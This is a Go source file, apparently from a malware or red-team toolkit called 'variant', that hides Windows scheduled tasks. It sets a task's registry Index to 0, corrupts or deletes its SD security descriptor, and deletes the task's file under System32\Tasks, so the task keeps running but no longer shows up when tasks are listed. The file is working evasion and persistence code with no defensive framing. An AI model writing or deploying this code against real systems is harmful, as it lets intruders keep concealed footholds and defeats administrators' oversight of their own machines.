package alive

import (
	"fmt"
	"os"
	"path/filepath"
	"strings"
	"variant/log"
	"variant/rand"

	"golang.org/x/sys/windows/registry"
)

const BaseAddr = `SOFTWARE\Microsoft\Windows NT\CurrentVersion\Schedule\TaskCache\Tree`

func IndexToZero(taskName string) error {
	taskReg := filepath.Join(BaseAddr, taskName)

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, taskReg, registry.QUERY_VALUE|registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer key.Close()

	// 查询注册表项是否存在
	value, _, err := key.GetIntegerValue("Index")
	if err != nil {
		return fmt.Errorf("failed to get 'Index' value:: %w", err)
	}

	if value != 0 {
		err = key.SetQWordValue("Index", 0)
		if err != nil {
			return fmt.Errorf("failed to set 'Index' to '0': %w", err)
		}

		err := DeleteTaskFile(taskName)
		if err != nil {
			return err
		}
	}

	return nil
}

func ChangeSD(taskName string) error {
	taskReg := filepath.Join(BaseAddr, taskName)

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, taskReg, registry.BINARY|registry.SET_VALUE)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer key.Close()

	value, _, err := key.GetBinaryValue("SD")
	if err != nil {
		return fmt.Errorf("failed to get 'SD' value:: %w", err)
	}

	if value != nil {
		newSD, _ := rand.LBytes(3)
		err = key.SetBinaryValue("SD", newSD)
		if err != nil {
			return fmt.Errorf("failed to set 'SD' to '0': %w", err)
		}
	}

	return nil
}

func DeleteSD(taskName string) error {
	taskReg := filepath.Join(BaseAddr, taskName)

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, taskReg, registry.BINARY|registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer key.Close()

	value, _, err := key.GetBinaryValue("SD")
	if err != nil {
		return fmt.Errorf("failed to get 'SD' value:: %w", err)
	}

	if value != nil {
		err := key.DeleteValue("SD")
		if err != nil {
			return fmt.Errorf("failed to delete 'SD' value:: %w", err)
		}
	}

	return nil
}

func RegDeleteTaskDir(dirName string) error {
	dirReg := filepath.Join(BaseAddr, dirName)

	key, err := registry.OpenKey(registry.LOCAL_MACHINE, dirReg, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer key.Close()

	value, err := key.ReadSubKeyNames(-1)
	if err != nil {
		log.Fatalf("failed to read subKey names: %v", err)
	}

	// 先删除注册表创建的计划任务文件中的所有子项
	for _, subKeyName := range value {
		err = registry.DeleteKey(key, subKeyName)
		if err != nil {
			log.Fatalf("failed to delete key: %v", err)
		}
	}

	// 删除注册表创建的计划任务文件
	err = DeleteUnderTreeDir(dirName)
	if err != nil {
		return err
	}

	// 删除创建的计划任务文件夹
	err = DeleteTaskDir(dirName)
	if err != nil {
		return err
	}

	return nil
}

func DeleteUnderTreeDir(dirName string) error {
	key, err := registry.OpenKey(registry.LOCAL_MACHINE, BaseAddr, registry.ALL_ACCESS)
	if err != nil {
		return fmt.Errorf("failed to open registry key: %w", err)
	}
	defer key.Close()

	value, err := key.ReadSubKeyNames(-1)
	if err != nil {
		log.Fatalf("failed to read subKey names: %v", err)
	}

	// 先删除创建的计划任务文件中的所有子项
	for _, subKeyName := range value {
		// 删除 Tree 项下自定义创建的计划任务文件夹，需要把文件夹中的子项全部删除，才能删除文件夹
		if strings.Contains(subKeyName, dirName) {
			err = registry.DeleteKey(key, subKeyName)
			if err != nil {
				log.Fatalf("failed to delete key: %v", err)
			}
		}
	}

	return nil
}

func DeleteTaskFile(taskName string) error {
	taskFile := filepath.Join(`C:\Windows\System32\Tasks`, taskName)

	if err := os.Remove(taskFile); err != nil {
		return fmt.Errorf("failed to delete task file: %w", err)
	}

	return nil
}

func DeleteTaskDir(dirName string) error {
	dirPath := filepath.Join(`C:\Windows\System32\Tasks`, dirName)

	if err := os.RemoveAll(dirPath); err != nil {
		return fmt.Errorf("failed to delete task dir: %w", err)
	}

	return nil
}
